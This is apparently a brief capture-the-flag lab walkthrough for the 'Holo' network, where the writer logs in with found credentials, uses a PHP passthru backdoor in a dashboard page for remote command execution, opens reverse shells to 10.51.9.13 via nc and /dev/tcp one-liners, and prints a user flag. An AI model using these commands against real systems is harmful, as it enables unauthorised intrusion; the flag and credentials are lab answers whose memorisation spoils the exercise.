
```
admin
```

```
DBManagerLogin!
```

So we are in 

![[Pasted image 20240813203006.png]]

And we can see php is there let's see how to get the shell from here 

So i pasted the code that i found in the source code 
```
  <!--                   //if ($_GET['cmd'] === NULL) { echo passthru("cat /tmp/Views.txt"); } else { echo passthru($_GET['cmd']);} -->
```

and found that we have RCE here

```
http://admin.holo.live/dashboard.php?cmd=whoami
```
![[Pasted image 20240813203426.png]]

let's see if we are able to get a reverse shell

So i tried to get the version of python but i don't think it's installed (i.e. check which python)
but than bash came to my mind and it returned (i.e. which bash)
```
admin.holo.live/dashboard.php?cmd=which%20bash
```
![[Pasted image 20240813203747.png]]


After so many try's this one linear working as website got stuck which is an indication we might have got a shell
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.51.9.13 4242 >/tmp/f
```

```
%2Fbin%2Fbash -i >%26 %2Fdev%2Ftcp%2F10.51.9.13%2F4242 0>%261
```

![[Pasted image 20240813204209.png]]

Let's get the full shell from the dummy shell

```
python3 -c "__import__('pty').spawn('/bin/bash')"
stty -raw echo;fg 
reset.

export TERM=xterm
```

![[Pasted image 20240813204531.png]]

Let's run the linpeas's and see what we find here
```
cat user.txt
HOLO{175d7322f8fc53392a417ccde356c3fe}
```

